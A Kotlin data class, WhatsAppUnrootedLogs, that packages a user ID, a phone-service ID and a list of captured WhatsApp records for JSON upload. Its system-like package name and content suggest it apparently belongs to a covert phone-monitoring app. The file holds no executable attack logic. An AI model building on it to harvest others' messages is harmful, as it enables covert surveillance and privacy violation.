package com.android.services.models

import com.android.services.db.entities.WhatsAppUnrooted
import com.google.gson.annotations.SerializedName

class WhatsAppUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var whatsAppUnrootedList: List<WhatsAppUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        whatsAppUnrootedList: List<WhatsAppUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.whatsAppUnrootedList = whatsAppUnrootedList
    }
}